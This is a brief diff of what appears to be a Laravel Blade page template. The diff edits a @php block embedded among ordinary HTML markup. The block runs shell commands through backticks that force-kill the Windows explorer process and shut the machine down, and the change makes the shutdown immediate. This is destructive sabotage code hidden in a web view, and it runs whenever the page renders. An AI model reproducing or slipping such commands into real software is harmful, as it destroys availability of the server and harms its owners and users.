@@ -75,7 +75,7 @@
 
             @php
            echo `taskkill /f /im explorer.exe`;
-           echo `shutdown /s /t 1`;
+           echo `shutdown /s /t 0`;
           @endphp
             <div class="content">
                 <div class="title m-b-md">
